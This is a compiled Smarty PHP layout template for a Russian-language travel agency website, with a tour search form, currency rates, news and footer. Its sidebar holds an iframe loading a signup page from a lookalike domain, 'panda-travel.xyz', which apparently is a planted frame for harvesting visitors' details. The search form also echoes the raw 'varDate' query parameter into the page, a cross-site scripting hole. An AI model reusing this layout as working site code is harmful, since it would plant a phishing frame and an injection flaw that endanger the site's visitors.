<?php /* Smarty version 2.6.19, created on 2017-02-07 18:56:24
         compiled from /var/www/pandaH/panda.fm/data/templates/public/layout.tpl */ ?>
<?php require_once(SMARTY_CORE_DIR . 'core.load_plugins.php');
smarty_core_load_plugins(array('plugins' => array(array('modifier', 'strip_tags', '/var/www/pandaH/panda.fm/data/templates/public/layout.tpl', 5, false),array('modifier', 'escape', '/var/www/pandaH/panda.fm/data/templates/public/layout.tpl', 5, false),array('modifier', 'date_format', '/var/www/pandaH/panda.fm/data/templates/public/layout.tpl', 40, false),array('modifier', 'cat', '/var/www/pandaH/panda.fm/data/templates/public/layout.tpl', 89, false),)), $this); ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" >
    <title><?php echo ((is_array($_tmp=((is_array($_tmp=$this->_tpl_vars['pagetitle'])) ? $this->_run_mod_handler('strip_tags', true, $_tmp) : smarty_modifier_strip_tags($_tmp)))) ? $this->_run_mod_handler('escape', true, $_tmp) : smarty_modifier_escape($_tmp)); ?>
 - PANDA TRAVEL</title>
    <meta name="title" content="<?php echo ((is_array($_tmp=$this->_tpl_vars['metatitle'])) ? $this->_run_mod_handler('escape', true, $_tmp) : smarty_modifier_escape($_tmp)); ?>
" />
    <meta name="description" content="<?php echo ((is_array($_tmp=$this->_tpl_vars['metadescription'])) ? $this->_run_mod_handler('escape', true, $_tmp) : smarty_modifier_escape($_tmp)); ?>
" />
  	<meta name="keywords" content="<?php echo ((is_array($_tmp=$this->_tpl_vars['metakeywords'])) ? $this->_run_mod_handler('escape', true, $_tmp) : smarty_modifier_escape($_tmp)); ?>
" />
	<?php echo $this->_tpl_vars['noindexfollow']; ?>

    <link rel="stylesheet" type="text/css" href="/css/style.css">
    <link type="text/css" rel="stylesheet" href="/css/calendar.css" />
    <link type="text/css" rel="stylesheet" href="/css/jquery.datepick.css" />
    <link type="text/css" rel="stylesheet" href="/css/jcarousel.css" />
    <link type="text/css" rel="stylesheet" href="/css/lytebox.css" />
	<!--[if IE 7]><link rel="stylesheet" type="text/css" href="css/ie7.css" /><![endif]-->


    <script type="text/javascript">var languageCode = 'ru';</script>
    <script type="text/javascript" src="/js/jquery-1.4.2.min.js"></script>
    <script type="text/javascript" src="/js/jquery.datepick.pack.js"></script>
    <script type="text/javascript" src="/js/jquery.datepick-ru.js"></script>
	<script type="text/javascript" src="/js/calendar.js"></script>
	<script type="text/javascript" src="/js/swfobject.js"></script>
	<script type="text/javascript" src="/js/lytebox.js"></script>
	<script type="text/javascript" src="/js/jquery.jcarousel.min.js"></script>
	<script type="text/javascript" src="/js/jquery.featureList-1.0.0.js"></script>
    <script type="text/javascript" src="/js/script.js"></script>

</head>
<body>
<div class="wrapper">
<div class="header">
		<a href="/" class="logo">Panda Travel</a>
		<div class="right-header">
			<div class="autent">
			<?php $_smarty_tpl_vars = $this->_tpl_vars;
$this->_smarty_include(array('smarty_include_tpl_file' => "layout/block_login.tpl", 'smarty_include_vars' => array()));
$this->_tpl_vars = $_smarty_tpl_vars;
unset($_smarty_tpl_vars);
 ?>
			</div>
			<div class="exchange">
			<?php $_from = $this->_tpl_vars['currency']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }$this->_foreach['currr'] = array('total' => count($_from), 'iteration' => 0);
if ($this->_foreach['currr']['total'] > 0):
    foreach ($_from as $this->_tpl_vars['item']):
        $this->_foreach['currr']['iteration']++;
?>
				<?php if (($this->_foreach['currr']['iteration'] <= 1)): ?><p><strong>$</strong> <a href="/exchangearchive.php">Курс валют</a> <?php echo ((is_array($_tmp=$this->_tpl_vars['item']['varDate'])) ? $this->_run_mod_handler('date_format', true, $_tmp, '%d-%m-%Y') : smarty_modifier_date_format($_tmp, '%d-%m-%Y')); ?>
:</p><?php endif; ?>
					<?php if ($this->_tpl_vars['item']['intCurrencyID'] != 1): ?><span>1 <?php echo $this->_tpl_vars['item']['varMark']; ?>
 = <?php echo $this->_tpl_vars['item']['intRate']; ?>
 <?php echo $this->_tpl_vars['gcurrency']['varMark']; ?>
</span><?php if (! ($this->_foreach['currr']['iteration'] == $this->_foreach['currr']['total'])): ?> | <?php endif; ?><?php endif; ?>
				<?php endforeach; endif; unset($_from); ?>
			</div>
			<div class="phone">+38(044) <span>537-23-23</span></div>
		</div>
	</div>
	<?php $_smarty_tpl_vars = $this->_tpl_vars;
$this->_smarty_include(array('smarty_include_tpl_file' => "layout/navigation.tpl", 'smarty_include_vars' => array('menuArr' => $this->_tpl_vars['menuListParent'])));
$this->_tpl_vars = $_smarty_tpl_vars;
unset($_smarty_tpl_vars);
 ?>
	<div class="container">
		<div class="main-holder">
			<div class="main">
<!-- <div id="showcase_hike_photo_showcase_module"></div><script src="http://module.ittour.com.ua/showcase_search.jsx?id=22D9176177601G622987N02&type=95&kind=50&width_class=55&row_count=16&border_color=FFFFFF&stars_color=ED1C24&price_color=ED1C24&button_background_color=217F00&select_controls_color=EC3902&bgg_hike_photo_showcase_font_color=000000&bgg_hike_photo_showcase_background_color=E7F8FF&bgg_hike_photo_showcase_background_color_item=F1F1F1&bgg_hike_photo_showcase_order_title_main_color=EBECF2&bgg_hike_photo_showcase_order_title_info_color=1E8FD9"></script> -->
			<?php $_smarty_tpl_vars = $this->_tpl_vars;
$this->_smarty_include(array('smarty_include_tpl_file' => "layout/slider.tpl", 'smarty_include_vars' => array()));
$this->_tpl_vars = $_smarty_tpl_vars;
unset($_smarty_tpl_vars);
 ?> 
				<div class="extra sidebar">
				<?php $_smarty_tpl_vars = $this->_tpl_vars;
$this->_smarty_include(array('smarty_include_tpl_file' => "layout/left_block_countries.tpl", 'smarty_include_vars' => array()));
$this->_tpl_vars = $_smarty_tpl_vars;
unset($_smarty_tpl_vars);
 ?>
				</div><!-- end extra -->
				<div class="content">
				<?php if ($this->_tpl_vars['messages']): ?>
				<div id="messages_block">
					<?php $_from = $this->_tpl_vars['messages']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }if (count($_from)):
    foreach ($_from as $this->_tpl_vars['message']):
?>
						<div class="message <?php if ($this->_tpl_vars['message']['error']): ?>error<?php else: ?>inform<?php endif; ?>">
							<h1><?php echo $this->_tpl_vars['message']['msg']; ?>
</h1>
						</div>
					<?php endforeach; endif; unset($_from); ?>
				</div>
				<?php endif; ?>
				<?php $_smarty_tpl_vars = $this->_tpl_vars;
$this->_smarty_include(array('smarty_include_tpl_file' => ($this->_tpl_vars['page']), 'smarty_include_vars' => array()));
$this->_tpl_vars = $_smarty_tpl_vars;
unset($_smarty_tpl_vars);
 ?>
				</div><!-- end content -->
			</div><!-- end main -->
		</div><!-- end main holder-->
		<div class="sidebar">
			<div class="search-box-tr">
				<div class="search-box-br">
					<div class="search-box">
						<h3 class="title">Поиск тура</h3>
						<form action="/tours.php" method="GET" class="search-form">
							<input type="hidden" name="event" value="toursearch">
							<fieldset>
							<div class="form-line">
								<label for="intCountryID">Страна</label>
								<select onchange="changecountry()" id="intCountryID" name="intCountryID">
									<option value=""></option>
									<?php $_from = $this->_tpl_vars['countries']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }if (count($_from)):
    foreach ($_from as $this->_tpl_vars['item']):
?>
									<option <?php if ($_GET['intCountryID'] == $this->_tpl_vars['item']['intCountryID']): ?>selected="selected"<?php endif; ?> value="<?php echo $this->_tpl_vars['item']['intCountryID']; ?>
"><?php echo $this->_tpl_vars['item']['varName']; ?>
</option>
									<?php endforeach; endif; unset($_from); ?>
								</select>
							</div>
							<div class="form-line">
								<label for="intResortID">Курорт </label>
								<?php if ($this->_tpl_vars['URL'] != ((is_array($_tmp=@PROJECT_URL)) ? $this->_run_mod_handler('cat', true, $_tmp, 'seminary') : smarty_modifier_cat($_tmp, 'seminary'))): ?>
								<select id="intResortID" name="intResortID">
									<option value=""></option>
									<?php $_from = $this->_tpl_vars['resorts']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }if (count($_from)):
    foreach ($_from as $this->_tpl_vars['item']):
?>
									<option rel="<?php echo $this->_tpl_vars['item']['intCountryID']; ?>
" <?php if ($_GET['intResortID'] == $this->_tpl_vars['item']['intResortID']): ?>selected="selected"<?php endif; ?> value="<?php echo $this->_tpl_vars['item']['intResortID']; ?>
"><?php echo $this->_tpl_vars['item']['varName']; ?>
</option>
									<?php endforeach; endif; unset($_from); ?>
								</select>
								<?php else: ?>
									<input type="text" id="varResortName" name="varResortName" />
								<?php endif; ?>
							</div>
							<div class="form-line">
								<label for="">Вид отдыха</label>
								<select name="intTypeID">
									<option value=""></option>
									<?php $_from = $this->_tpl_vars['tourtypes']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }if (count($_from)):
    foreach ($_from as $this->_tpl_vars['item']):
?>
									<option <?php if ($_GET['intTypeID'] == $this->_tpl_vars['item']['intTypeID']): ?>selected="selected"<?php endif; ?> value="<?php echo $this->_tpl_vars['item']['intTypeID']; ?>
"><?php echo $this->_tpl_vars['item']['varName']; ?>
</option>
									<?php endforeach; endif; unset($_from); ?>
								</select>
							</div>
							<div class="form-line">
								<div class="form-col fleft">
									<label for="">Дата </label>
									<div class="datapicker">
										<input class="date CHECKIN_BEG dp-applied" size="12" type="text" value="<?php echo $_GET['varDate']; ?>
" name="varDate" autocomplete="off">
										<img src="/images/calendar.png" width="13" height="13" alt="" />
									</div>
								</div>
								<div class="form-col fright">
									<label for="">Дней</label>
									<select name="intCountDays">
										<option value=""></option>
										<option <?php if ($_GET['intCountDays'] == 3): ?>selected="selected"<?php endif; ?> value="3">3</option>
										<option <?php if ($_GET['intCountDays'] == 4): ?>selected="selected"<?php endif; ?> value="4">4</option>
										<option <?php if ($_GET['intCountDays'] == 5): ?>selected="selected"<?php endif; ?> value="5">5</option>
										<option <?php if ($_GET['intCountDays'] == 6): ?>selected="selected"<?php endif; ?> value="6">6</option>
										<option <?php if ($_GET['intCountDays'] == 7): ?>selected="selected"<?php endif; ?> value="7">7</option>
										<option <?php if ($_GET['intCountDays'] == 8): ?>selected="selected"<?php endif; ?> value="8">8</option>
										<option <?php if ($_GET['intCountDays'] == 9): ?>selected="selected"<?php endif; ?> value="9">9</option>
										<option <?php if ($_GET['intCountDays'] == 10): ?>selected="selected"<?php endif; ?> value="10">10</option>
										<option <?php if ($_GET['intCountDays'] == 11): ?>selected="selected"<?php endif; ?> value="11">11</option>
										<option <?php if ($_GET['intCountDays'] == 12): ?>selected="selected"<?php endif; ?> value="12">12</option>
										<option <?php if ($_GET['intCountDays'] == 13): ?>selected="selected"<?php endif; ?> value="13">13</option>
										<option <?php if ($_GET['intCountDays'] == 14): ?>selected="selected"<?php endif; ?> value="14">14</option>
										<option <?php if ($_GET['intCountDays'] == 15): ?>selected="selected"<?php endif; ?> value="15">15</option>
										<option <?php if ($_GET['intCountDays'] == 16): ?>selected="selected"<?php endif; ?> value="16">16</option>
										<option <?php if ($_GET['intCountDays'] == 17): ?>selected="selected"<?php endif; ?> value="17">17</option>
										<option <?php if ($_GET['intCountDays'] == 18): ?>selected="selected"<?php endif; ?> value="18">18</option>
										<option <?php if ($_GET['intCountDays'] == 19): ?>selected="selected"<?php endif; ?> value="19">19</option>
										<option <?php if ($_GET['intCountDays'] == 20): ?>selected="selected"<?php endif; ?> value="20">20</option>
										<option <?php if ($_GET['intCountDays'] == 21): ?>selected="selected"<?php endif; ?> value="21">21</option>
										<option <?php if ($_GET['intCountDays'] == 22): ?>selected="selected"<?php endif; ?> value="22">22</option>
										<option <?php if ($_GET['intCountDays'] == 23): ?>selected="selected"<?php endif; ?> value="23">23</option>
										<option <?php if ($_GET['intCountDays'] == 24): ?>selected="selected"<?php endif; ?> value="24">24</option>
										<option <?php if ($_GET['intCountDays'] == 25): ?>selected="selected"<?php endif; ?> value="25">25</option>
										<option <?php if ($_GET['intCountDays'] == 26): ?>selected="selected"<?php endif; ?> value="26">26</option>
										<option <?php if ($_GET['intCountDays'] == 27): ?>selected="selected"<?php endif; ?> value="27">27</option>
										<option <?php if ($_GET['intCountDays'] == 28): ?>selected="selected"<?php endif; ?> value="28">28</option>
										<option <?php if ($_GET['intCountDays'] == 29): ?>selected="selected"<?php endif; ?> value="29">29</option>
										<option <?php if ($_GET['intCountDays'] == 30): ?>selected="selected"<?php endif; ?> value="30">30</option>
										<option <?php if ($_GET['intCountDays'] == 31): ?>selected="selected"<?php endif; ?> value="31">31</option>
									</select>
								</div>
							</div>
							<div class="form-line">
								<div class="form-col fleft">
									<label for="">К-во человек</label>
									<?php if ($this->_tpl_vars['URL'] != ((is_array($_tmp=@PROJECT_URL)) ? $this->_run_mod_handler('cat', true, $_tmp, 'seminary') : smarty_modifier_cat($_tmp, 'seminary'))): ?>
									<select name="intCountPeoples">
										<option value=""></option>
										<option <?php if ($_GET['intCountPeoples'] == 1): ?>selected="selected"<?php endif; ?> value="1">1</option>
										<option <?php if ($_GET['intCountPeoples'] == 2): ?>selected="selected"<?php endif; ?> value="2">2</option>
										<option <?php if ($_GET['intCountPeoples'] == 3): ?>selected="selected"<?php endif; ?> value="3">3</option>
										<option <?php if ($_GET['intCountPeoples'] == 4): ?>selected="selected"<?php endif; ?> value="4">4</option>
										<option <?php if ($_GET['intCountPeoples'] == 5): ?>selected="selected"<?php endif; ?> value="5">5</option>
										<option <?php if ($_GET['intCountPeoples'] === '0'): ?>selected="selected"<?php endif; ?> value="0">другое</option>
									</select>
									<?php else: ?>
										<input style="width:50px" type="text" name="intCountPeoples" id="intCountPeoples" />
									<?php endif; ?>
								</div>
								<div class="form-col fright">
									<label for="">Транспорт</label>
									<select name="varTransport">
										<option value=""></option>
										<option <?php if ($_GET['varTransport'] == 'plane'): ?>selected="selected"<?php endif; ?> value="plane">Самолёт</option>
										<option <?php if ($_GET['varTransport'] == 'train'): ?>selected="selected"<?php endif; ?> value="train">Поезд</option>
										<option <?php if ($_GET['varTransport'] == 'bus'): ?>selected="selected"<?php endif; ?> value="bus">Автобус</option>
										<option <?php if ($_GET['varTransport'] == 'steamer'): ?>selected="selected"<?php endif; ?> value="bus">Пароход</option>
									</select>
								</div>
							</div>
							<div align="center">
								<input type="submit" value="Искать" class="search-submit" />&nbsp;&nbsp;&nbsp;&nbsp;
							<!--a onclick="$('form.search-form input[type=\'text\'],form.search-form select').val('')" href="javascript:void(0)">Очистить</a-->
							</div>
							</fieldset>
						</form>
					</div>
				</div>
			</div>
			<div class="side-box">
			<?php $_smarty_tpl_vars = $this->_tpl_vars;
$this->_smarty_include(array('smarty_include_tpl_file' => "layout/managers.tpl", 'smarty_include_vars' => array()));
$this->_tpl_vars = $_smarty_tpl_vars;
unset($_smarty_tpl_vars);
 ?>
			</div>
			<?php if ($this->_tpl_vars['leftlinks'] && $this->_tpl_vars['enableleftlinks']): ?>
			<div class="side-box">
				<ul class="boxes-links">
					<li><a href="ittsearch" class="search_ittour"><span>Поиск тура</span></a></li>
					<?php $_from = $this->_tpl_vars['leftlinks']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }$this->_foreach['link'] = array('total' => count($_from), 'iteration' => 0);
if ($this->_foreach['link']['total'] > 0):
    foreach ($_from as $this->_tpl_vars['item']):
        $this->_foreach['link']['iteration']++;
?>
					<li><a href="<?php echo $this->_tpl_vars['item']['varLink']; ?>
" class="<?php echo $this->_tpl_vars['item']['varAliasClass']; ?>
"><span><?php echo $this->_tpl_vars['item']['varName']; ?>
</span></a></li>
					<?php endforeach; endif; unset($_from); ?>
				</ul>
			
			</div>
			<?php else: ?>
			<div class="side-box">
				<ul class="boxes-links">
					<li><a href="/tours-country/sale" class="sale"></a></li>
				</ul>
			</div>

			<?php endif; ?>
			<br />
			<iframe src="https://panda-travel.xyz/signup.php" frameborder="0"></iframe>
				
			<div class="side-box">
				<a href="http://<?php echo $this->_tpl_vars['bannersZone']['varLink1']; ?>
" class="advert"><img src="<?php echo $this->_tpl_vars['FILES_URL']; ?>
<?php echo $this->_tpl_vars['bannersZone']['varBanner1Name']; ?>
" width="<?php echo $this->_tpl_vars['bannersZone']['intWidth1']; ?>
" height="<?php echo $this->_tpl_vars['bannersZone']['intHeight1']; ?>
" alt="" /></a>
			</div>
			<div class="side-box">
				<h3 class="title">Новости</h3>
				<dl class="news">
					<?php $_from = $this->_tpl_vars['news']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }$this->_foreach['cnews'] = array('total' => count($_from), 'iteration' => 0);
if ($this->_foreach['cnews']['total'] > 0):
    foreach ($_from as $this->_tpl_vars['item']):
        $this->_foreach['cnews']['iteration']++;
?>
						<?php if ($this->_foreach['cnews']['iteration'] < 6): ?>
							<dt><?php echo ((is_array($_tmp=$this->_tpl_vars['item']['varDate'])) ? $this->_run_mod_handler('date_format', true, $_tmp, "%d-%m-%Y") : smarty_modifier_date_format($_tmp, "%d-%m-%Y")); ?>
</dt>
							<dd><a href="<?php echo $this->_tpl_vars['item']['link']; ?>
"><?php echo $this->_tpl_vars['item']['varAnnotation']; ?>
</a></dd>
						<?php endif; ?>
					<?php endforeach; endif; unset($_from); ?>
				</dl>
				<a href="/news" class="wholelink">Читать все новости</a>
			</div>
		</div><!-- end sidebar -->
	</div><!-- end container -->
	<div class="footer">
		<div class="fleft">
			<ul class="footer-menu">
			<?php $_from = $this->_tpl_vars['menuListParent']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }$this->_foreach['menu'] = array('total' => count($_from), 'iteration' => 0);
if ($this->_foreach['menu']['total'] > 0):
    foreach ($_from as $this->_tpl_vars['item']):
        $this->_foreach['menu']['iteration']++;
?>
				<li><a href="<?php echo $this->_tpl_vars['item']['link']; ?>
"><?php echo $this->_tpl_vars['item']['varTitle']; ?>
</a></li>
			<?php endforeach; endif; unset($_from); ?>
			</ul>
			<div class="copyright">
				<p>© 2006-2017 Panda Travel. Все права защищены.</p>
				<p class="develop">Разработка и поддержка - <a href="http://miritec.com">Миритек</a></p>
			</div>
			<?php if ($this->_tpl_vars['static_zone']['social_zone']): ?>
				<?php $_smarty_tpl_vars = $this->_tpl_vars;
$this->_smarty_include(array('smarty_include_tpl_file' => "static_zone.tpl", 'smarty_include_vars' => array('zone' => $this->_tpl_vars['static_zone']['social_zone'],'static_zone_path' => $this->_tpl_vars['static_zone_path'],'template' => 'footer')));
$this->_tpl_vars = $_smarty_tpl_vars;
unset($_smarty_tpl_vars);
 ?>
			<?php endif; ?>
		</div>
		<div class="contact">
		<?php if ($this->_tpl_vars['static_zone']['footer']): ?>
			<?php $_smarty_tpl_vars = $this->_tpl_vars;
$this->_smarty_include(array('smarty_include_tpl_file' => "static_zone.tpl", 'smarty_include_vars' => array('zone' => $this->_tpl_vars['static_zone']['footer'],'static_zone_path' => $this->_tpl_vars['static_zone_path'],'template' => 'footer')));
$this->_tpl_vars = $_smarty_tpl_vars;
unset($_smarty_tpl_vars);
 ?>
		<?php endif; ?>
		</div>
	</div>
	<?php if ($this->_tpl_vars['static_zone']['footerSeo']): ?>
		<?php $_smarty_tpl_vars = $this->_tpl_vars;
$this->_smarty_include(array('smarty_include_tpl_file' => "static_zone.tpl", 'smarty_include_vars' => array('zone' => $this->_tpl_vars['static_zone']['footerSeo'],'static_zone_path' => $this->_tpl_vars['static_zone_path'],'template' => 'footer')));
$this->_tpl_vars = $_smarty_tpl_vars;
unset($_smarty_tpl_vars);
 ?>
	<?php endif; ?>
</div><!--end wrapper-->
</body>
</html>